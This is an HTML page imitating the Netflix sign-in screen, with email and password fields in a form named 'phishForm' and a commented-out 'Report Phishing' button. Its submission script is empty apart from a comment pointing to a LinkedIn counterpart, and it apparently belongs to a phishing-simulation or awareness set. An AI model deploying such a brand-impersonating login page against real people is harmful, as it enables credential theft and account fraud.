<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Sign In</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #141414; color: white; }
    </style>
</head>
<body>
    <div class="container mx-auto px-4 py-8">
        <!-- Report Button -->
        <!-- <div class="flex justify-end mb-4">
            <button id="reportPhishing" class="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded flex items-center">
                <i class="fas fa-flag mr-2"></i> Report Phishing
            </button>
        </div> -->

        <!-- Netflix Logo -->
        <div class="flex justify-center mb-8">
            <span class="text-red-600 font-bold text-5xl">NETFLIX</span>
        </div>

        <!-- Login Form -->
        <div class="max-w-md mx-auto bg-black bg-opacity-70 p-8 rounded">
            <h1 class="text-3xl font-bold mb-6">Sign In</h1>
            <form id="phishForm">
                <div class="mb-4">
                    <input type="email" placeholder="Email or phone number" class="w-full px-4 py-3 bg-gray-800 rounded focus:outline-none focus:ring-1 focus:ring-red-500">
                </div>
                <div class="mb-6">
                    <input type="password" placeholder="Password" class="w-full px-4 py-3 bg-gray-800 rounded focus:outline-none focus:ring-1 focus:ring-red-500">
                </div>
                <button type="submit" class="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded font-bold">
                    Sign In
                </button>
            </form>
            <div class="mt-4 text-gray-400">
                <label class="flex items-center">
                    <input type="checkbox" class="mr-2"> Remember me
                </label>
            </div>
            <div class="mt-8 text-gray-400">
                <p>New to Netflix? <a href="#" class="text-white hover:underline">Sign up now</a>.</p>
            </div>
        </div>
    </div>

    <script>
        // Same reporting/submission logic as LinkedIn
    </script>
</body>
</html>
